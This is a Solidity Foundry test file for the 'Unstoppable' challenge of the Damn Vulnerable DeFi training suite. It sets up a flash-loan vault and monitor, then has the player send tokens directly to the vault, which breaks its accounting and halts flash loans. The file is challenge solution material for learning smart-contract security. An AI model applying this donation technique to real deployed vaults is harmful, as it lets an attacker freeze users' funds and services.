//SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import{Test,console} from "forge-std/Test.sol";
import{DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault} from "../../src/unstoppable/UnstoppableVault.sol";
import{UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";

contract UnstoppableChallenge2 is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault  public vault;
    UnstoppableMonitor public monitorContract;

    function setUp() public {

        startHoax(deployer);
        token = new DamnValuableToken();
        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});//Constructor arguments...
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT,address(deployer));//ERC4626 function...
        
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
        monitorContract = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitorContract));

        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        monitorContract.checkFlashLoan(100e18);
        vm.stopPrank();
    }

    function test_flashTesst() public {

        vm.startPrank(player,player);
        token.transfer(address(vault),1e18);
        vm.stopPrank();
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        vm.startPrank(deployer);

        monitorContract.checkFlashLoan(100e18);

        vm.stopPrank();
    }



    



}

